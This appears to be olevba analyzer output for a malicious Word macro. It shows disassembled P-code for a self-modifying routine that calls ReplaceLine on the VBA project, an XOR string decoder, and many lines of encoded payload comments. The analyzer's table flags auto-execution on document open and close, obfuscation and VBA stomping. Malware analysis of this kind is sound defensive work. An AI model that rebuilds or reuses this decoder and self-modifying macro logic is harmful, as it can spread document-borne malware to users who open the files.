' 	Ld Comp 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' 	BoS 0x0000 
' 	EndFunc 
' Line #66:
' 	FuncDefn (Private Function Decode(s, k As Integer, id_FFFE As Variant))
' Line #67:
' 	Dim 
' 	VarDefn r
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	St r 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld False 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld s 
' 	FnLen 
' 	For 
' 	BoS 0x0000 
' 	Ld s 
' 	Ld False 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	Paren 
' 	St A 
' 	BoS 0x0000 
' 	Ld A 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Eq 
' 	Ld A 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	Ld r 
' 	Ld A 
' 	Add 
' 	St r 
' 	BoS 0x0000 
' 	GoTo Over 
' 	EndIf 
' Line #68:
' 	Ld A 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0000 ""
' 	St A 
' 	BoS 0x0000 
' 	Ld r 
' 	Ld A 
' 	Add 
' 	St r 
' 	BoS 0x0000 
' 	GoTo Over 
' 	EndIf 
' Line #69:
' 	Ld r 
' 	Ld s 
' 	Ld False 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	Paren 
' 	Ld k 
' 	Xor 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St r 
' 	BoS 0x0000 
' 	Ld k 
' 	LitDI2 0x0002 
' 	Add 
' 	St k 
' 	BoS 0x0000 
' 	Ld k 
' 	LitDI2 0x00FA 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x00E6 
' 	St k 
' 	EndIf 
' Line #70:
' 	Label Over 
' 	StartForVariable 
' 	Ld False 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	Ld r 
' 	St Decode 
' Line #71:
' 	EndFunc 
' Line #72:
' 	QuoteRem 0x0000 0x0043 "©†Ê©œ‚�†Öªƒ›Ÿ�‹Ð¼‘ŽŒÜÈ¹‰šÐŠ˜·ˆ–È×Ì­‚—•‚�©Š€‰�„ÚÖ³€…�†Â¯€‚˜Ÿ›‡œƒƒ€ÒÛ"
' Line #73:
' 	QuoteRem 0x0000 0x004F "½�Ø³«‹Ÿ‹Ø¶�„Ðž„«œžÞ³„†”�‹‹˜‡ŸœÚ¥Œ‡šž™ž “€žØÍÈÈ°¬Ÿ�ŸÇÖÄÁÃÌÒÎÒ¡µ™•�ÂÎ¬¿½¿ÇÚÏÈ¾„‹ž"
' Line #74:
' 	QuoteRem 0x0000 0x0079 "¡�…Œƒ…Ä¼œ™„•‚�¶š…Š‡œ—§‚Š�†�ÄÌÒÞÔÔ°­­³³­¥ ¦³¶²·¿¿«¢®§™ž’Ÿ‹ž‹¬¿�•Š‰›…Šš¬½’�‘…�¶ÔÀÀ®±Ž›ƒ„¶¡‡“€›…—€œÊ©–“—˜ÔÔÆÊ¥œš™�š…ÎÄÁÊÑÎÒÐ"
' Line #75:
' 	QuoteRem 0x0000 0x008C "§�‹’�‡Â¾‚›‚—Œƒ¸˜ƒˆ™ž‘¥Œ”�„‹ÆÒÐØÖÚ®£¯µ±¼½··´¹¥«¯¦¹¼±ª«‰Žž›�‚—¨»‘…š…Ÿ�–†¨¹ž€�‰‰²ÈÜÄª¶ƒŸÊ¹�•€Ô¥�’œƒ‚‰ƒ®±Ž›ƒ„¶¡‡“€›…—€œÊ©–“—˜ÔÔÆÊ¥œš™�š…ÎÄÁÊÑÎÒÐ"
' Line #76:
' 	QuoteRem 0x0000 0x0044 "Œš¹–˜Ä»�‚™–™—�›Ä­Š”Ü§—Žƒ©™Ì–œ³„†Ö§˜š€‡““€Ÿ—ˆÆ¹˜�‚†�†¨‡œ‚ÌÈÐÐ¨´—‰ƒÛÂÌ"
' Line #77:
' 	QuoteRem 0x0000 0x009B "£—€Ö±‡…ÊÑÎ¾�†›™Š¼��žœ“€“Ö°ªºž�š——‚Ö°ª©ƒƒ€�š“–’›ÂÝÇÞ±›’�«‡Ž™‚•ÈÔ¥�’È¯”�•žÔËØž„«œžÞ¥›„“„‡…‡�ØÐ¶™—�ÙÄÎÇÞ¤¶¦Š‰‚��šÞ¤¶µ—‹˜…‚‹ž†‡Ø±’�‡ÄÌ¤š�…¯‰š�Ž�Ÿ™ÖßÖ¥‡Ž‰£Ÿ–�š�"
' Line #78:
' 	QuoteRem 0x0000 0x008D "±�ž„ÎµŠ—“”ÜÈ¼…œ³��“ØÛÈ£�ƒÞ¾�˜�•ÀÛÀÎ¹“™Ø»‰�„˜¡–¾�˜�•ÈÇÌßÀÛÎÖÖ¯†™‰œ„¾�˜�•ÈÛÀÎ¦›†µ—‚�ÐÌÀ¢—„š™…�†…€•ÒÜ¿™‹Æ©ƒ›ž†»�´�†�ŸÎÝÒÅÆÑÊÈÈ©€”Ò§ƒšÄÒÊ©€”Ò£ŸŒŽ"
' Line #79:
' 	QuoteRem 0x0000 0x0031 "�†­ž€Ü£™Š�Š…ƒ…ƒÚÖ´—‰ƒÛÂÌÙÜ·š—•�Ê¿�†—·ž™ˆ��ŸÔÍ¦†ƒ�"
' Line #80:
' 	QuoteRem 0x0000 0x0016 "ž„«œžÞ³„†”�‹‹˜‡ŸœÚ§��œ"
' Line #81:
' 	QuoteRem 0x0000 0x0006 "¯‚ŠÐ»’"
' Line #82:
' 	QuoteRem 0x0000 0x0057 "©†Ê©œ‚�†Öªƒ›Ÿ�‹Ð¼‘ŽŒÜÈ¥œš™�š…Öµ‰œ‰ Ÿ€™—”¶š…�ž„ÒÉÖ¾‡„™‰ÔÐ½„‚‘‰†™Â¸™€�…¨”‡ž‰�„››˜ØÛÈ¬�‚ƒ—"
' Line #83:
' 	QuoteRem 0x0000 0x00E0 "§“ŒÆ©‰˜­‘€†Ÿ�”È×Ì¯“†�€�¢‡‰™ƒ•œ€Ø®¤¸˜ƒ„•‘€Ø®¤«…�žŸœ‘˜Œ•ÀÛÅÀ³��“µ‰ŒŸ€‹ÊÒ½�Ø®‡ŸžÆ¾�ƒßØÛÈÛÞÎ±œ�Öµ�†Ÿ˜‹Ø¼›�ÑÆÖÊÝÞÐ³š’Ø«�„™š•Úº™�ÏÈÖÌÜÅÒ ž�ˆÈ§Ÿ‰²�ŒÖÚ¯œ™Ìš™Ÿ‘Öž‰šÊ€›ž‘œÖÚÆÎÊ­ž€ž�•™’�…‚À¥�‘„¶‡…�ÀÎÀÞÔÔ¯‰†Ž‰œÐ„ÆØÈÆŠ“Ìº˜·Ô�½�ºŽÌ©•¼�£‹Ä"
' Line #84:
' 	QuoteRem 0x0000 0x0045 "»�˜Î¾�†›»‡š˜…‹‚ÒÉÖ¶‰š‡�‚¤—™†”‡œ�Â¸²¢†™’ƒ‹žÂ¸²±››ˆ‰†�‚šƒÚÅßÖ¥‡Ž‰£Ÿ–�š�"
' Line #85:
' 	QuoteRem 0x0000 0x0045 "¨¡ÊÑÎ¾�†›™Š¼��žœ“€“Ö°ªºž�š——‚Ö°ª©ƒƒ€�š“–’›ÂÝÇÞ±›’�«‡Ž™‚•Ü¸Ÿ–ƒ›ÂØÜÜÒÅß"
' Line #86:
' 	QuoteRem 0x0000 0x0045 "¹¯È×Ì¯“†�€�¢‡‰™ƒ•œ€Ø®¤¸˜ƒ„•‘€Ø®¤«…�žŸœ‘˜Œ•ÀÛÅÀ³��“µ‰ŒŸ€‹Þ¾�˜�•ÀÞÞÂÐÃÝ"
' Line #87:
' 	QuoteRem 0x0000 0x0053 "¿žÆºƒ‹†„ÖÜ¸±ÊÈÓÅÎÍÒÖ²—…�‡‰€„¼ÖÖ¬Ž�„Ì Ÿ€™¿–•œ‹€‚•–ÔËØ²šŸ‰Îµž‡“Ø¨‡˜�§ž�€—”Š�ŽÌÓÐ´•š‹ƒ"
' Line #88:
' 	QuoteRem 0x0000 0x004F "¡ŒÌ¼™•œ‚ÜÎ¦£ÀÎÉÛÔÊÆÆÊ®ƒ�…Ÿ‘˜Œ¨ÊÊ­€”Òº™Š‹«‹žœ™—†Ø»‰�„˜¡–¾�˜�•ÈÖÒÎÀÒ ž�ˆÈ¯”‡„Ò§ƒš"
' Line #89:
' 	QuoteRem 0x0000 0x0051 "¯ŽÊ¾‡—š€ÒÐ§¡ÆÌ×ÙÒÉÖÚ¢‡‰™ƒ•œ€·ÚÆ¼‚‰€Ð³—‚±ˆ›ž�‚œ—�ÖÅÆ¼˜™‹Ð·˜…�Æ©‰˜§ž�€—”Š�ŽÌÓÐ´•š‹ƒ"
' Line #90:
' 	QuoteRem 0x0000 0x004E "¡ŒÌ¼™•œ‚ÜÎ©£ÀÎÉÛÔÊÆÆÊ®ƒ�…Ÿ‘˜Œ§ÊÊ­€”Òµ•Œ¥‰˜ž‡•€Úµ—“†ž£ˆ¼›š“‹ÆÔÔÌÞÐ¦œ“–Æ­’…šÐ¡�”"
' Line #91:
' 	QuoteRem 0x0000 0x003D "±€È¤ƒœ�»š…Œ‡„†‰ŠÐÏÔ¢Š“�Ê­€”Òµ•Œ¯†™˜�œž‘’ØÛÈ¾ž›•Ò ž�ˆÈ¯”‡„Ò§ƒš"
' Line #92:
' 	QuoteRem 0x0000 0x0091 "¯ŽÊ¢�‚Ÿ½˜‹’‰†€‹”ÒÉÖ¾‡„™‰Î¤š‘˜ÂÆ»�˜Î¹œ’“›’�…‚ÎÍÒº™Š‹«‹žœ™—†ÌØµ�žÌ­‘€†Ÿ�”È×Ì¯“†·—Š”��žÔÐ·˜…�ÜÈ¹‰šÐ»š��…œƒƒ€ÐÏÔ·›’«‹žœ™—†ÌØµ�žÌ­‘€†Ÿ�”È×Ì Ÿ€™µ™”šƒ‰œ"
' Line #93:
' 	QuoteRem 0x0000 0x0054 "§›€žØ¥‰˜ž‡•€ÎÖ¢ÆÕÊÄÀ³��˜Œ©Ž¦…€•�ÔÛØ×ÝÃÖÎ¦›†µ—‚�ÊÑÎÞ¾�˜�•ÀÛÀÎªÛÎÖ½ˆŒÊ»‡„šÎÖ¹ÆÕÊ¶ÎÝÒÅÃ"
' Line #94:
' 	QuoteRem 0x0000 0x0042 "¯�œ‚Ì§ž”‘•Œ�‡„ÖÎÞ»š…�”œ¦…€•�ÔÇÔÆ¾ƒž­Ÿ–‘ÌØÈº�œ‚‘‘‘º‘ˆ�Ê¶ÂÐÐ±˜œÆ»ŸŽÌ"
' Line #95:
' 	QuoteRem 0x0000 0x006D "¹”Ô¸—”…£‚�„“˜š�‚È×Ì¨‘ž‡“Ø²€�‚ÎÞ ‘†”‡‹� ‡ž—ÔÂÊÊÈ©„œØÁÍßØÍÈÈ¸†™�°™›“…�‚š¾ÐÔ³”•�ÐÌÀ¢—„š™…�¦…€•ÒÀÄÔÆ«‚žÆÃËÝÖÓÆÊ«Î"
' Line #96:
' 	QuoteRem 0x0000 0x0008 "«ž–Ô¡‘’€"
' Line #97:
' 	QuoteRem 0x0000 0x0014 "©†Ê©œ‚�†Öªƒ›Ÿ�‹Ð¼‘ŽŒ"
' Line #98:
' 	QuoteRem 0x0000 0x004C "µ�žÌ«¨ÒÉÖ¬Ž�™»�‚™–™—�Æ¼®¾‚�ž“›’Æ¼®­ŸŸ„™–ƒ†žŸÀ¹†‘›ÐÄ¼‚…�§�†�š‰‡�ÎÇÞ±›’�«‡Ž™‚•"
' Line #99:
' 	QuoteRem 0x0000 0x006C "»’Ö­¥‰™‰Æ´›†Þ¹–˜†…�‘†�™–È»ž�œ„‡„¦™’€ÊÇÎÒ®¶™—�ÙÄÎÇÙÒÈÈØÄª¥£¥ÁÐÔ·–‚È¸…‰˜†ÐÞ½¾Æ¦…€•�ÜÂÈÊÈÛÅÂÐÇÝÖÄØÈÈ¥€¢‡šÔØ²€�‚"
' Line #100:
' 	QuoteRem 0x0000 0x0079 "«¨Ü¦“ˆŠ‰‰‰¢™œ‘ÖÌÖÄÊ¯†‚ÚÇÏÑÆÃÊÎ§ž �˜ÚÜÈ¹‰šÐ¥›„œ©Š€ÌÓÐµ‘‚·„‚��šØÞÔÔ¯‰šŽÂ¯€‚˜Ÿ›‡œƒƒ€ÒÛÎÖ±€È½ƒœ”½–œØÚÖÊÎÌÐ¦œ“–Æ¯…¸�Ð£�ŸŒ¹¼‚…�"
' Line #101:
' 	QuoteRem 0x0000 0x0081 "£—€Ö¯‰šŽ£ŒšÒÉÖ»”�‹˜‹¿�ž“›’ÀÈ»�‚–Ú·ˆ–„ƒ��„››˜ÚÏÒÊ¿‹„Òº¢ØÛÈ½ƒœ”½–œÖ¨‡˜��œ¦‘›ˆŠ‰ž‰À¦°¤„—Œ�‰˜À¦°·™•–‡„‰€„�ÜÔ¬Ž�™¨�“‡™“–’ÊÃÂ­Ÿ–‘»—‚�†‰"
' Line #102:
' 	QuoteRem 0x0000 0x0036 "§–Ò¦ŸŸŽœÎÄ ¤Ü¸Ÿ–ƒ›ÂØÜÜÒÅßÔÆÙÙÅÎÌÌÔÔ¬Ž�™¨�“‡™“–’¦ÈÌº˜—š"
' Line #103:
' 	QuoteRem 0x0000 0x0029 "¡—”Œ¥Ž„Þ½„‚‘‰†™Â½‘„‘¸—”…‹€¾‚�™†ŒÆÕÊª�œ�‘Ì"
' Line #104:
' 	QuoteRem 0x0000 0x0084 "¶²Æ®‰‚•†‘º‘ˆ�™ÌßÜÒº¢Ö¥‡Ÿ‚š¿”˜Ÿ–ƒ›ÐÌ ¤Ü½˜‹ƒšž ‡ž—‡ÖÉÊÈÈ¼›’ž�•Øµ�ˆÌª™�•””ƒ©¼ÄÇÒÈÔ¸¬È¡„Ÿ‹‚†¸Ÿ–ƒ›ÊÞÂÐÐ»†Œ�‡„ŸÀ¦›†ƒ‹¶š…˜‹“†�™–ÆÕÊª�œ�‘ÌÚÜ"
' Line #105:
' 	QuoteRem 0x0000 0x0095 "¦¾Â§ž�‘„Œª�„‰�ÐÁØÖÚµ‘™˜‹�Ü¤„‘�‰ž‰¾‚�’Ÿ”ƒ»žž‡ž•ÜÔÚÄÊÆÌÌÒº¿³¡¹«¿¾¼µ¼ ©­µ­¸°½Ÿ”€�™”�¶¡‡“€›…—€œ¶£ˆ–›—“¤ÞÆÚ°«ˆ‘‘š¤«�‰ž�ƒ�’‚Ø£�‰‰‚ÒÐØÖÚÄ§š˜‡Ÿœ‡ÀÚÄÁÊÑÎÒÐÖÔÚ"
' Line #106:
' 	QuoteRem 0x0000 0x00A8 "¨¼Ä¥€ƒ—†‚´�†�ŸÎÄÞÔÔ«Ÿ›ž‰ƒÞ¢†ŸŽ‡œ�¼œŸ”�š�µœ˜…€—ÚÖÔÚÄÄÊÎÌ¸¹±¯§ª§©­¢¯¿µµ°¯¦¯°½Ÿ”€�™”�¶¡‡“€›…—€œ¶£ˆ–›—“¤ÞÆÚ° •…Ô£‹ƒšÊ¿‹„†�˜Ÿ•´¯”�•ž¨»‘…š…Ÿ�–†Ô³€…�†ÎÌÜÒÖÔ·–œƒƒ€ƒÄÖÔÑÆÕÊÎÌÒÐÖ"
' Line #107:
' 	QuoteRem 0x0000 0x0049 "¸¬È¡„Ÿ‹‚†¸Ÿ–ƒ›ÊÙÂÐÐ±˜œÆ»ŸŽÌÊÒ£™Š‚§ˆ†À¢‡šÖÚ¨‡˜��œÜ ž‘•¬…�›�—š‚Ö¢�™�Œœ—µ ÚÜ"
' Line #108:
' 	QuoteRem 0x0000 0x0021 "¦¾Âª•ž‘‚�ª�„‰�ÐÃØÖ¶²Æ©ƒ›ž†»�”�†�Ÿ"
' Line #109:
' 	QuoteRem 0x0000 0x0047 "¸™€·™œƒÈ×Ì«¨Ü¸Ÿ–ƒ›ÂÝÂÐ·¬Ø»‰�„˜¡–ž�˜�•ÈÇÌÜÅÛÎÖ¶²Æ£‚�•€€º‘ˆ�™ÌßÜÒ¢ŸŠ¥‡Ž‰Ô"
' Line #110:
' 	QuoteRem 0x0000 0x003E "¾¦Ú¤�–„‹�‹¼›š“ØÎ¦¾Â­Ÿ‡š‚·€„ƒ‚‹ƒÛØÖÚ£†ŽÌ½…�ÖÌØµ�žÌ ¤ÒÉÖ¶‰œ‚…€—È"
' Line #111:
' 	QuoteRem 0x0000 0x0069 "£™Š�Š…ƒ…ƒÜµ’œÈ»‹š‹±�Ô°‘Š�¤�ƒ•ÈÉ·ˆ–„ƒ��„››˜Öµœ‹žš…‚¤—ŒŽÈÌÌÌ¬°›™“×ÆÈÀÎ¶›˜“¾‰š‡�šÊÏŒš¶‰š‡�‚ÜÒµ’œ²‡§ž›ÊÏ²—”•�"
' Line #112:
' 	QuoteRem 0x0000 0x004C "¹‰šÐ³£ÖÅÆ¼‚…�§�†�š‰‡�Â¸²¢†™’ƒ‹žÂ¸²±››ˆ‰†�‚šƒÜ½‚�‹ÀÈ¸†™�£™Š�Š…ƒ…ÒÛÚµ—‚�§ƒŠ…ž‘"
' Line #113:
' 	QuoteRem 0x0000 0x0053 "¥�’È£»ÎÍÒ£™Š�Š…ƒ…ƒÚÖ´—‰ƒÛÂÌÙÜ¢´¨”‡€‰�„Ü¢´»‰…šƒ€•œ€…Ö¯œ��ÆÒ¦œŸ‹±‡˜‡ŒŸ�ŸÔÑÈ«…ˆ‹½��ƒ”ƒ"
' Line #114:
' 	QuoteRem 0x0000 0x00BF "¡ŒÌ¼™•œ‚ÜÎ¡½Â¢™œ‘…ÐÒÚÆÌßÙÞÔÇËÏÈÖÒÎÒ¦œŸ‹¢‡‰™ƒ•œ€¸ÚÆ¼‚‰€Ð¤�„»‰Œ�ÌÓÐ³£Ø´�†�ŸÆÁÞÔ·¯È«…™€„½’š‘ˆ�™ÌÃÐÀÁßÂÆ¡½Â§ž�‘„Œª�„‰�ÐÃØÖ®�š©ƒŠ•ÈÔ¿¯Èº�œ‚‘‘‘º‘ˆ�Ê¥¹Þ±›ƒ–’§Œ€‡ž—‡ÚØÄ­„ˆÎ£‡–ÔÂÆ¡½Â¼•‚˜—›ƒ¤ƒ‚‹ÐÆÄÚØÄÊ"
' Line #115:
' 	QuoteRem 0x0000 0x002B "½ƒœ›�›™“•ÀÈ®�Ÿ™ÅØÚÏÆ©€�ƒ—Ô¥™��©„�ž•‘…ÂÛ¼˜™‹"
' Line #116:
' 	QuoteRem 0x0000 0x0015 "µœ�Ö±€ÒÊ»�‚–»”’È¹Ÿ…šÊ"
' Line #117:
' 	QuoteRem 0x0000 0x000A "£�ŸŒ¹¼‚…�Ê"
' Line #118:
' 	QuoteRem 0x0000 0x0072 "·š’Ø¯ŽÐÌ½•†Ô·¯ÆÕÊ¸†™�£™Š�Š…ƒ…Þ¤¶¦Š‰‚��šÞ¤¶µ—‹˜…‚‹ž†‡Ø±’�‡ÄÌ¤š�…¯‰š�Ž�Ÿ™ÖßÖ¥‡Ž‰£Ÿ–�š�ÜÈ¬ƒœÐ›ÔËØ×È¾ƒÎ§�†�š‰‡�ŸÀ³��˜Œ"
' Line #119:
' 	QuoteRem 0x0000 0x004C "µ�žÌ§§ÒÉÖ¯‰š�Ž�Ÿ™‡Þ‘ÏÆ¼®¾‚�ž“›’Æ¼®­ŸŸ„™–ƒ†žŸÀ¹†‘›ÐÄ¼‚…�§�†�š‰‡�ÎÇÞ±›’�«‡Ž™‚•"
' Line #120:
' 	QuoteRem 0x0000 0x00BF "»’Öª��‚˜ÊØ»£Ø´�†�ŸÆÄÀØÖÉÏÄÊÝÝÙÒÈÈØÄ¼‚…�´�—ƒ•ƒ†ž¢ÌÐ¦œ“–Æ¾ƒž­Ÿ–‘ÖÅÆ©½Â¢™œ‘…Ð×ÄÊ­¹Þ±›ƒ–’§Œ€‡ž—‡ÖÕÆÚßÅÔÐ»£Ø±ˆ›�žš¼›š“‹ÆÙÆÌ¸™€·™œƒÒÊ¥¹Þ ‘†”‡‹� ‡ž—Ô¿¯È«…™€„½’š‘ˆ�™ÀÎÒ·š’Øµ�ˆÎÔÐ»£Øªƒ˜†��•¾�˜�ÆÜÚÀÎÒÐ"
' Line #121:
' 	QuoteRem 0x0000 0x0041 "º“€’ÒÊ­¹Þ ‘†”‡‹� ‡ž—ÔÂÈÊÈ©„œØÁÍßÂÆ¿…ž…’�›�‹ÎÊ¨ƒ�›ÃÖßÖµ‰œ‰ŠÐÏÔ¢Š“�"
' Line #122:
' 	FuncDefn (Private Sub Mail_Item())
' Line #123:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

